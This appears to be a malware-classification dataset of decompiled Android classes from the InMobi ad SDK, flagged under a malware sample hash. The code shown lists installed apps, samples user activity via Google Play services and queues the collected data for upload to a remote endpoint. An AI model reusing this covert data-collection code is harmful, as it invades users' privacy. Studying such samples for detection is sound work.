Log.internal(InternalSDKUtil.LOGGING_TAG,""Table: "" + concat);           sQLiteDatabase.execSQL(concat);         }       }     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception creating table"",e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.db\TableData.code","public class TableData {   private String a;   private LinkedHashMap<String,ColumnData> b;   public String getmTableName(){     return this.a;   }   public void setmTableName(  String str){     this.a=str;   }   public LinkedHashMap<String,ColumnData> getmColumns(){     return this.b;   }   public void setmColumns(  LinkedHashMap<String,ColumnData> linkedHashMap){     this.b=linkedHashMap;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@170a7293static class a extends Handler {   private boolean a;   public a(  Looper looper){     super(looper);     this.a=true;   }   @Override public void handleMessage(  Message message){     if (message.what == 1001 && this.a) {       this.a=false;       ApplicationFocusManager.b(Boolean.valueOf(this.a));     }  else     if (message.what == 1002 && !this.a) {       this.a=true;       ApplicationFocusManager.b(Boolean.valueOf(this.a));     }   } } public static class a {   a(){   }   static String a(  Context context){     return WebSettings.getDefaultUserAgent(context);   } } public static class a implements ApplicationFocusManager.FocusChangedListener {   a(){   }   @Override public void onFocusChanged(  boolean z){     if (!z) {       ThinICE.b();     }  else {       IceDataCollector.start(InternalSDKUtil.getContext());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ActivityRecognitionManager.code","public class ActivityRecognitionManager extends IntentService {   static Object a=null;   static Object b=null;   private static Object d=null;   private static Object e=null;   static int c=-1;   public ActivityRecognitionManager(){     super(""InMobi activity service"");   }   private static boolean a(){     if (Build.VERSION.SDK_INT < 8) {       return false;     }     if (c == -1) {       try {         a=Class.forName(""com.google.android.gms.location.DetectedActivity"").getConstructor(Integer.TYPE,Integer.TYPE).newInstance(-1,100);         c=1;         if (GooglePlayServicesUtil.isGooglePlayServicesAvailable(InternalSDKUtil.getContext()) != 0) {           c=0;           return false;         }       }  catch (      ClassNotFoundException e2) {         Log.debug(InternalSDKUtil.LOGGING_TAG,""Google play services not included."");         c=0;       } catch (      Exception e3) {         Log.debug(InternalSDKUtil.LOGGING_TAG,""Google play services not included."");         c=0;       }     }     return c == 1;   }   public static void init(  Context context){     if (a()) {       a(context);     }   }   private static void a(  Context context){     Class<?> cls=null;     try {       if (a != null) {         Class<?> cls2=Class.forName(""com.google.android.gms.common.GooglePlayServicesClient"");         Class<?> cls3=Class.forName(""com.google.android.gms.location.ActivityRecognitionClient"");         if (b != null) {           cls2.getMethod(""disconnect"",(Class[])null).invoke(b,(Object[])null);         }         Class<?>[] declaredClasses=cls2.getDeclaredClasses();         int length=declaredClasses.length;         int i=0;         Class<?> cls4=null;         while (i < length) {           Class<?> cls5=declaredClasses[i];           if (cls5.getSimpleName().equalsIgnoreCase(""ConnectionCallbacks"")) {             d=Proxy.newProxyInstance(cls5.getClassLoader(),new Class[]{cls5},new b());           }  else           if (cls5.getSimpleName().equalsIgnoreCase(""OnConnectionFailedListener"")) {             e=Proxy.newProxyInstance(cls5.getClassLoader(),new Class[]{cls5},new b());             cls4=cls5;             cls5=cls;           }  else {             cls5=cls;           }           i++;           cls=cls5;         }         b=cls3.getDeclaredConstructor(Context.class,cls,cls4).newInstance(context,d,e);         cls2.getMethod(""connect"",(Class[])null).invoke(b,(Object[])null);       }     }  catch (    ClassCastException e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Init: Google play services not included. Cannot get current activity."");     } catch (    Exception e3) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Init: Something went wrong during ActivityRecognitionManager.init"",e3);     }   }   @Override protected void onHandleIntent(  Intent intent){     if (a()) {       a(intent);     }   }   private void a(  Intent intent){     try {       Class<?> cls=Class.forName(""com.google.android.gms.location.ActivityRecognitionResult"");       if (((Boolean)cls.getMethod(""hasResult"",Intent.class).invoke(null,intent)).booleanValue()) {         a=cls.getMethod(""getMostProbableActivity"",(Class[])null).invoke(cls.getMethod(""extractResult"",Intent.class).invoke(null,intent),(Object[])null);       }     }  catch (    ClassNotFoundException e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""HandleIntent: Google play services not included. Cannot get current activity."");     } catch (    Exception e3) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""HandleIntent: Google play services not included. Cannot get current activity."");     }   }   public static int getDetectedActivity(){     try {       if (a == null) {         return -1;       }       return ((Integer)Class.forName(""com.google.android.gms.location.DetectedActivity"").getMethod(""getType"",(Class[])null).invoke(a,(Object[])null)).intValue();     }  catch (    ClassNotFoundException e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""getDetectedActivity: Google play services not included. Returning null."");       return -1;     } catch (    Exception e3) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""getDetectedActivity: Google play services not included. Returning null."");       return -1;     }   } public static class b implements InvocationHandler {     private b(){     }     public void a(    Bundle bundle){       try {         PendingIntent service=PendingIntent.getService(InternalSDKUtil.getContext().getApplicationContext(),0,new Intent(InternalSDKUtil.getContext().getApplicationContext(),(Class<?>)ActivityRecognitionManager.class),134217728);         if (GooglePlayServicesUtil.isGooglePlayServicesAvailable(InternalSDKUtil.getContext()) == 0) {           try {             Class.forName(""com.google.android.gms.location.ActivityRecognitionClient"").getMethod(""requestActivityUpdates"",Integer.class,PendingIntent.class).invoke(ActivityRecognitionManager.b,1000,service);           }  catch (          Exception e) {             Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to request activity updates from ActivityRecognition client"");             Class.forName(""com.google.android.gms.common.GooglePlayServicesClient"").getMethod(""disconnect"",(Class[])null).invoke(ActivityRecognitionManager.b,(Object[])null);           }         }  else {           Class.forName(""com.google.android.gms.common.GooglePlayServicesClient"").getMethod(""disconnect"",(Class[])null).invoke(ActivityRecognitionManager.b,(Object[])null);         }       }  catch (      Exception e2) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to request activity updates from ActivityRecognition client"");       }     }     @Override public Object invoke(    Object obj,    Method method,    Object[] objArr) throws Throwable {       if (objArr != null) {         try {           if (method.getName().equals(""onConnected"")) {             a((Bundle)objArr[0]);           }         }  catch (        Exception e) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to invoke method"",e);         }       }       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ActivityRecognitionSampler.code","public class ActivityRecognitionSampler {   static Looper b;   static Handler c;   static List<ActivitySample> d=new ArrayList();   static HandlerThread a=new HandlerThread(""ActivityDetectionSampler""); public static class ActivitySample {     private long a;     private int b;     public long getTimestamp(){       return this.a;     }     public int getActivity(){       return this.b;     }     public ActivitySample(    int i,    long j){       this.b=i;       this.a=j;     }   } static {     a.start();     b=a.getLooper();     c=new a(b);   }   public static void b(){     if (AnalyticsInitializer.getConfigParams().getThinIceConfig().isActivityDetectionEnabled()) {       c.sendMessageDelayed(c.obtainMessage(1),AnalyticsInitializer.getConfigParams().getThinIceConfig().getActivityDetectionInterval());     }   }   public static void start(){     if (!c.hasMessages(1)) {       c.sendEmptyMessage(1);     }   }   public static void stop(){     c.removeMessages(1);     d.clear();   }   public static List<ActivitySample> getCollectedList(){     return AnalyticsInitializer.getConfigParams().getThinIceConfig().isActivityDetectionEnabled() ? d : Collections.emptyList();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ActivitySample.code","public static class ActivitySample {   private long a;   private int b;   public long getTimestamp(){     return this.a;   }   public int getActivity(){     return this.b;   }   public ActivitySample(  int i,  long j){     this.b=i;     this.a=j;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ApiEventType.code","public static class ApiEventType implements EventType {   public static final int API_IMAI_OPEN_EMBEDDED=1001;   public static final int API_IMAI_OPEN_EXTERNAL=1002;   public static final int API_IMAI_PING=1003;   public static final int API_IMAI_PING_IN_WEB_VIEW=1004;   public static final int API_MRAID_ASYNC_PING=31;   public static final int API_MRAID_CLOSE=13;   public static final int API_MRAID_CLOSE_VIDEO=50;   public static final int API_MRAID_CREATE_CALENDAR_EVENT=30;   public static final int API_MRAID_EXPAND=11;   public static final int API_MRAID_GET_AUDIO_VOLUME=37;   public static final int API_MRAID_GET_CURRENT_POSITION=18;   public static final int API_MRAID_GET_DEFAULT_POSITION=19;   public static final int API_MRAID_GET_EXPAND_PROPERTIES=4;   public static final int API_MRAID_GET_GALLERY_IMAGE=25;   public static final int API_MRAID_GET_MAX_SIZE=20;   public static final int API_MRAID_GET_MIC_INTENSITY=51;   public static final int API_MRAID_GET_ORIENTATION=16;   public static final int API_MRAID_GET_ORIENTATION_PROPERTIES=5;   public static final int API_MRAID_GET_PLACEMENT_TYPE=15;   public static final int API_MRAID_GET_RESIZE_PROPERTIES=6;   public static final int API_MRAID_GET_SCREEN_SIZE=17;   public static final int API_MRAID_GET_STATE=3;   public static final int API_MRAID_GET_VIDEO_VOLUME=45;   public static final int API_MRAID_HIDE_VIDEO=48;   public static final int API_MRAID_IS_AUDIO_MUTED=35;   public static final int API_MRAID_IS_VIDEO_MUTED=43;   public static final int API_MRAID_IS_VIEWABLE=14;   public static final int API_MRAID_MAKE_CALL=29;   public static final int API_MRAID_MUTE_AUDIO=33;   public static final int API_MRAID_MUTE_VIDEO=41;   public static final int API_MRAID_OPEN=1;   public static final int API_MRAID_OPEN_EXTERNAL=2;   public static final int API_MRAID_PAUSE_AUDIO=39;   public static final int API_MRAID_PAUSE_VIDEO=47;   public static final int API_MRAID_PLAY_AUDIO=32;   public static final int API_MRAID_PLAY_VIDEO=40;   public static final int API_MRAID_POST_TO_SOCIAL=21;   public static final int API_MRAID_RESIZE=12;   public static final int API_MRAID_SEEK_AUDIO=38;   public static final int API_MRAID_SEEK_VIDEO=46;   public static final int API_MRAID_SEND_MAIL=28;   public static final int API_MRAID_SEND_SMS=27;   public static final int API_MRAID_SET_AUDIO_VOLUME=36;   public static final int API_MRAID_SET_EXPAND_PROPERTIES=7;   public static final int API_MRAID_SET_ORIENTATION_PROPERTIES=8;   public static final int API_MRAID_SET_RESIZE_PROPERTIES=9;   public static final int API_MRAID_SET_VIDEO_VOLUME=44;   public static final int API_MRAID_SHOW_VIDEO=49;   public static final int API_MRAID_STORE_PICTURE=23;   public static final int API_MRAID_SUPPORTS=22;   public static final int API_MRAID_TAKE_CAMERA_PICTURE=24;   public static final int API_MRAID_UNMUTE_AUDIO=34;   public static final int API_MRAID_UNMUTE_VIDEO=42;   public static final int API_MRAID_USE_CUSTOM_CLOSE=10;   public static final int API_MRAID_VIBRATE=26;   int a;   public ApiEventType(  int i){     this.a=i;   }   @Override public int getValue(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ApiStatCollector.code","public class ApiStatCollector {   private static Logger a=new Logger(3,""apiStats"",new c()); public static class ApiEventType implements EventType {     public static final int API_IMAI_OPEN_EMBEDDED=1001;     public static final int API_IMAI_OPEN_EXTERNAL=1002;     public static final int API_IMAI_PING=1003;     public static final int API_IMAI_PING_IN_WEB_VIEW=1004;     public static final int API_MRAID_ASYNC_PING=31;     public static final int API_MRAID_CLOSE=13;     public static final int API_MRAID_CLOSE_VIDEO=50;     public static final int API_MRAID_CREATE_CALENDAR_EVENT=30;     public static final int API_MRAID_EXPAND=11;     public static final int API_MRAID_GET_AUDIO_VOLUME=37;     public static final int API_MRAID_GET_CURRENT_POSITION=18;     public static final int API_MRAID_GET_DEFAULT_POSITION=19;     public static final int API_MRAID_GET_EXPAND_PROPERTIES=4;     public static final int API_MRAID_GET_GALLERY_IMAGE=25;     public static final int API_MRAID_GET_MAX_SIZE=20;     public static final int API_MRAID_GET_MIC_INTENSITY=51;     public static final int API_MRAID_GET_ORIENTATION=16;     public static final int API_MRAID_GET_ORIENTATION_PROPERTIES=5;     public static final int API_MRAID_GET_PLACEMENT_TYPE=15;     public static final int API_MRAID_GET_RESIZE_PROPERTIES=6;     public static final int API_MRAID_GET_SCREEN_SIZE=17;     public static final int API_MRAID_GET_STATE=3;     public static final int API_MRAID_GET_VIDEO_VOLUME=45;     public static final int API_MRAID_HIDE_VIDEO=48;     public static final int API_MRAID_IS_AUDIO_MUTED=35;     public static final int API_MRAID_IS_VIDEO_MUTED=43;     public static final int API_MRAID_IS_VIEWABLE=14;     public static final int API_MRAID_MAKE_CALL=29;     public static final int API_MRAID_MUTE_AUDIO=33;     public static final int API_MRAID_MUTE_VIDEO=41;     public static final int API_MRAID_OPEN=1;     public static final int API_MRAID_OPEN_EXTERNAL=2;     public static final int API_MRAID_PAUSE_AUDIO=39;     public static final int API_MRAID_PAUSE_VIDEO=47;     public static final int API_MRAID_PLAY_AUDIO=32;     public static final int API_MRAID_PLAY_VIDEO=40;     public static final int API_MRAID_POST_TO_SOCIAL=21;     public static final int API_MRAID_RESIZE=12;     public static final int API_MRAID_SEEK_AUDIO=38;     public static final int API_MRAID_SEEK_VIDEO=46;     public static final int API_MRAID_SEND_MAIL=28;     public static final int API_MRAID_SEND_SMS=27;     public static final int API_MRAID_SET_AUDIO_VOLUME=36;     public static final int API_MRAID_SET_EXPAND_PROPERTIES=7;     public static final int API_MRAID_SET_ORIENTATION_PROPERTIES=8;     public static final int API_MRAID_SET_RESIZE_PROPERTIES=9;     public static final int API_MRAID_SET_VIDEO_VOLUME=44;     public static final int API_MRAID_SHOW_VIDEO=49;     public static final int API_MRAID_STORE_PICTURE=23;     public static final int API_MRAID_SUPPORTS=22;     public static final int API_MRAID_TAKE_CAMERA_PICTURE=24;     public static final int API_MRAID_UNMUTE_AUDIO=34;     public static final int API_MRAID_UNMUTE_VIDEO=42;     public static final int API_MRAID_USE_CUSTOM_CLOSE=10;     public static final int API_MRAID_VIBRATE=26;     int a;     public ApiEventType(    int i){       this.a=i;     }     @Override public int getValue(){       return this.a;     }   }   public static Logger getLogger(){     return a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\AppDetectionManager.code","public class AppDetectionManager {   public static JSONArray getInstalledApps(){     try {       if (!AnalyticsInitializer.getConfigParams().getThinIceConfig().isAppDetectionEnabled() || FileOperations.getLongPreferences(InternalSDKUtil.getContext(),""AppDetectionPrefs"",""AppDetectionCollectionTimestamp"") + AnalyticsInitializer.getConfigParams().getThinIceConfig().getAppDetectionInterval() >= System.currentTimeMillis()) {         return null;       }       PackageManager packageManager=InternalSDKUtil.getContext().getPackageManager();       JSONArray jSONArray=new JSONArray();       for (      ApplicationInfo applicationInfo : packageManager.getInstalledApplications(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS)) {         JSONObject jSONObject=new JSONObject();         String str=applicationInfo.packageName;         boolean z=(applicationInfo.flags & 1) != 0;         jSONObject.put(""a-bid"",str);         jSONObject.put(""a-system"",z);         jSONArray.put(jSONObject);       }       JSONArray jSONArray2=jSONArray.length() == 0 ? null : jSONArray;       if (jSONArray2 != null) {         FileOperations.setPreferences(InternalSDKUtil.getContext(),""AppDetectionPrefs"",""AppDetectionCollectionTimestamp"",System.currentTimeMillis());         return jSONArray2;       }       return jSONArray2;     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception fetching app meta data"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ApplicationFocusManager.code","public class ApplicationFocusManager {   protected static final int MSG_PAUSED=1001;   protected static final int MSG_RESUMED=1002;   private static Object b;   private static Application d;   private static List<FocusChangedListener> a=new ArrayList();   private static HandlerThread c=null; public interface FocusChangedListener {     void onFocusChanged(    boolean z);   }   public static void init(  Activity activity){     if (Build.VERSION.SDK_INT >= 14 && d == null) {       d=activity.getApplication();     }   }   private static void b(){     c=new HandlerThread(""InMobiAFM"");     c.start();     b=new b();     if (b != null) {       d.registerActivityLifecycleCallbacks((Application.ActivityLifecycleCallbacks)b);     }   } public static class b implements Application.ActivityLifecycleCallbacks {     private final Handler a=new a(ApplicationFocusManager.c.getLooper());     b(){     }     @Override public void onActivityCreated(    Activity activity,    Bundle bundle){     }     @Override public void onActivityDestroyed(    Activity activity){     }     @Override public void onActivityPaused(    Activity activity){       this.a.sendEmptyMessageDelayed(1001,3000L);     }     @Override public void onActivityResumed(    Activity activity){       this.a.removeMessages(1001);       this.a.sendEmptyMessage(1002);     }     @Override public void onActivitySaveInstanceState(    Activity activity,    Bundle bundle){     }     @Override public void onActivityStarted(    Activity activity){     }     @Override public void onActivityStopped(    Activity activity){     }   }   private static void c(){     if (b != null) {       d.unregisterActivityLifecycleCallbacks((Application.ActivityLifecycleCallbacks)b);     }     c.stop();     c=null;   }   public static void addFocusChangedListener(  FocusChangedListener focusChangedListener){     if (Build.VERSION.SDK_INT >= 14) {       a.add(focusChangedListener);       if (a.size() == 1) {         b();       }     }   }   public static void removeFocusChangedListener(  FocusChangedListener focusChangedListener){     if (Build.VERSION.SDK_INT >= 14) {       a.remove(focusChangedListener);       if (a.size() == 0) {         c();       }     }   }   public static void b(  Boolean bool){     Iterator<FocusChangedListener> it=a.iterator();     while (it.hasNext()) {       it.next().onFocusChanged(bool.booleanValue());     }   } static class a extends Handler {     private boolean a;     public a(    Looper looper){       super(looper);       this.a=true;     }     @Override public void handleMessage(    Message message){       if (message.what == 1001 && this.a) {         this.a=false;         ApplicationFocusManager.b(Boolean.valueOf(this.a));       }  else       if (message.what == 1002 && !this.a) {         this.a=true;         ApplicationFocusManager.b(Boolean.valueOf(this.a));       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\b.code","public static class b implements InvocationHandler {   private b(){   }   public void a(  Bundle bundle){     try {       PendingIntent service=PendingIntent.getService(InternalSDKUtil.getContext().getApplicationContext(),0,new Intent(InternalSDKUtil.getContext().getApplicationContext(),(Class<?>)ActivityRecognitionManager.class),134217728);       if (GooglePlayServicesUtil.isGooglePlayServicesAvailable(InternalSDKUtil.getContext()) == 0) {         try {           Class.forName(""com.google.android.gms.location.ActivityRecognitionClient"").getMethod(""requestActivityUpdates"",Integer.class,PendingIntent.class).invoke(ActivityRecognitionManager.b,1000,service);         }  catch (        Exception e) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to request activity updates from ActivityRecognition client"");           Class.forName(""com.google.android.gms.common.GooglePlayServicesClient"").getMethod(""disconnect"",(Class[])null).invoke(ActivityRecognitionManager.b,(Object[])null);         }       }  else {         Class.forName(""com.google.android.gms.common.GooglePlayServicesClient"").getMethod(""disconnect"",(Class[])null).invoke(ActivityRecognitionManager.b,(Object[])null);       }     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to request activity updates from ActivityRecognition client"");     }   }   @Override public Object invoke(  Object obj,  Method method,  Object[] objArr) throws Throwable {     if (objArr != null) {       try {         if (method.getName().equals(""onConnected"")) {           a((Bundle)objArr[0]);         }       }  catch (      Exception e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to invoke method"",e);       }     }     return null;   } } public static class b implements Application.ActivityLifecycleCallbacks {   private final Handler a=new a(ApplicationFocusManager.c.getLooper());   b(){   }   @Override public void onActivityCreated(  Activity activity,  Bundle bundle){   }   @Override public void onActivityDestroyed(  Activity activity){   }   @Override public void onActivityPaused(  Activity activity){     this.a.sendEmptyMessageDelayed(1001,3000L);   }   @Override public void onActivityResumed(  Activity activity){     this.a.removeMessages(1001);     this.a.sendEmptyMessage(1002);   }   @Override public void onActivitySaveInstanceState(  Activity activity,  Bundle bundle){   }   @Override public void onActivityStarted(  Activity activity){   }   @Override public void onActivityStopped(  Activity activity){   } } class b implements ThinICEListener {   @Override public void onSamplingTerminated(  List<Sample> list){     ThinICE.b((List<Sample>)list);     IceDataCollector.stop();     ActivityRecognitionSampler.stop();   } } public static class b implements RetryMechanism.RetryRunnable {   final String a;   b(  String str){     this.a=str;   }   @Override public void run() throws Exception {     Log.internal(InternalSDKUtil.LOGGING_TAG,""Sending ThinICE data to server "" + AnalyticsInitializer.getConfigParams().getThinIceConfig().getEndpointUrl());     if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {       ThinICE.b(this.a);       return;     }     throw new Exception(""Device not connected."");   }   @Override public void completed(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\Base64.code","public final class Base64 extends com.inmobi.commons.thirdparty.Base64 {   private Base64(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\c.code","class c implements Storage.PreProcessor {   @Override public JSONObject process(  JSONObject jSONObject){     HashMap hashMap=new HashMap();     try {       JSONArray jSONArray=jSONObject.getJSONArray(""payload"");       for (int i=0; i < jSONArray.length(); i++) {         int i2=jSONArray.getJSONObject(i).getInt(""t"");         Integer num=(Integer)hashMap.get(Integer.valueOf(i2));         if (num == null) {           hashMap.put(Integer.valueOf(i2),1);         }  else {           hashMap.put(Integer.valueOf(i2),Integer.valueOf(num.intValue() + 1));         }       }       JSONArray jSONArray2=new JSONArray();       for (      Map.Entry entry : hashMap.entrySet()) {         JSONObject jSONObject2=new JSONObject();         jSONObject2.put(""t"",entry.getKey());         jSONObject2.put(""v"",entry.getValue());         jSONArray2.put(jSONObject2);       }       jSONObject.put(""payload"",jSONArray2);     }  catch (    JSONException e) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Unable to aggregate data. Sending data as-is."");     }     return jSONObject;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\CommonsConfig.code","public class CommonsConfig {   private static Log.INTERNAL_LOG_LEVEL a=Log.INTERNAL_LOG_LEVEL.NONE;   private static Log.INTERNAL_LOG_LEVEL b=a;   private MetricConfigParams c=new MetricConfigParams();   public static int getLogLevelConfig(){     return b.getValue();   }   public MetricConfigParams getApiStatsConfig(){     return this.c;   }   public final void setFromMap(  Map<String,Object> map) throws Exception {     Map<String,Object> populateToNewMap=InternalSDKUtil.populateToNewMap((Map)map.get(""AND""),(Map)map.get(""common""),true);     new UID().setFromMap((Map)populateToNewMap.get(""ids""));     UID.getCommonsUid().setFromMap((Map)populateToNewMap.get(""ids""));     b=Log.getLogLevelValue(InternalSDKUtil.getIntFromMap(populateToNewMap,""ll"",0,2L));     this.c.setFromMap((Map)populateToNewMap.get(""api""));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\CommonsException.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6d4ec15a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\d.code","class d implements CacheController.Validator {   @Override public boolean validate(  Map<String,Object> map){     return InternalSDKUtil.a(map);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\FileOperations.code","public class FileOperations {   public static boolean setPreferences(  Context context,  String str,  String str2,  String str3){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to set preferences..App context NULL"");       return false;     }     SharedPreferences.Editor edit=context.getSharedPreferences(str,0).edit();     edit.putString(str2,str3);     edit.commit();     return true;   }   public static void setPreferences(  Context context,  String str,  String str2,  boolean z){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to set preferences..App context NULL"");       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(str,0).edit();     edit.putBoolean(str2,z);     edit.commit();   }   public static void setPreferences(  Context context,  String str,  String str2,  int i){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to set preferences..App context NULL"");       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(str,0).edit();     edit.putInt(str2,i);     edit.commit();   }   public static void setPreferences(  Context context,  String str,  String str2,  long j){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to set preferences..App context NULL"");       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(str,0).edit();     edit.putLong(str2,j);     edit.commit();   }   public static void setPreferences(  Context context,  String str,  String str2,  float f){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to set preferences..App context NULL"");       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(str,0).edit();     edit.putFloat(str2,f);     edit.commit();   }   public static String getPreferences(  Context context,  String str,  String str2){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to get preferences..App context NULL"");       return null;     }     return context.getSharedPreferences(str,0).getString(str2,null);   }   public static boolean getBooleanPreferences(  Context context,  String str,  String str2){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to get preferences..App context NULL"");       return false;     }     return context.getSharedPreferences(str,0).getBoolean(str2,false);   }   public static int getIntPreferences(  Context context,  String str,  String str2){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to get preferences..App context NULL"");       return 0;     }     return context.getSharedPreferences(str,0).getInt(str2,0);   }   public static long getLongPreferences(  Context context,  String str,  String str2){     if (context == null || str == null || str2 == null || """".equals(str.trim()) || """".equals(str2.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Failed to get preferences..App context NULL"");       return 0L;     }     return context.getSharedPreferences(str,0).getLong(str2,0L);   }   public static java.lang.Object readFromFile(  android.content.Context r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.commons.internal.FileOperations.readFromFile(android.content.Context, java.lang.String):java.lang.Object"");   }   public static boolean saveToFile(  Context context,  String str,  Object obj){     if (context == null || str == null || """".equals(str.trim()) || obj == null) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Cannot read map application context of Filename NULL"");       return false;     }     try {       ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(new File(context.getDir(""data"",0),str),false));       objectOutputStream.writeObject(obj);       objectOutputStream.flush();       if (objectOutputStream != null) {         try {           objectOutputStream.close();         }  catch (        IOException e) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Log File Close Exception"");           return false;         }       }       return true;     }  catch (    FileNotFoundException e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Log File Not found"",e2);       return false;     } catch (    IOException e3) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Log File IO Exception"",e3);       return false;     }   }   public static boolean isFileExist(  Context context,  String str){     return new File(context.getDir(""data"",0),str).exists();   }   public static String readFileAsString(  Context context,  String str) throws IOException {     File file=new File(context.getCacheDir().getAbsolutePath() + File.separator + str);     file.createNewFile();     BufferedReader bufferedReader=new BufferedReader(new FileReader(file));     StringBuffer stringBuffer=new StringBuffer();     while (true) {       String readLine=bufferedReader.readLine();       if (readLine == null) {         break;       }       stringBuffer.append(""\n"").append(readLine);     }     bufferedReader.close();     return stringBuffer.length() >= 1 ? stringBuffer.substring(1).toString() : """";   }   public static void writeStringToFile(  Context context,  String str,  String str2,  boolean z) throws IOException {     File file=new File(context.getCacheDir().getAbsolutePath() + File.separator + str);     file.createNewFile();     BufferedWriter bufferedWriter=new BufferedWriter(new FileWriter(file,z));     bufferedWriter.write(str2);     bufferedWriter.close();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\FocusChangedListener.code","public interface FocusChangedListener {   void onFocusChanged(  boolean z); } "
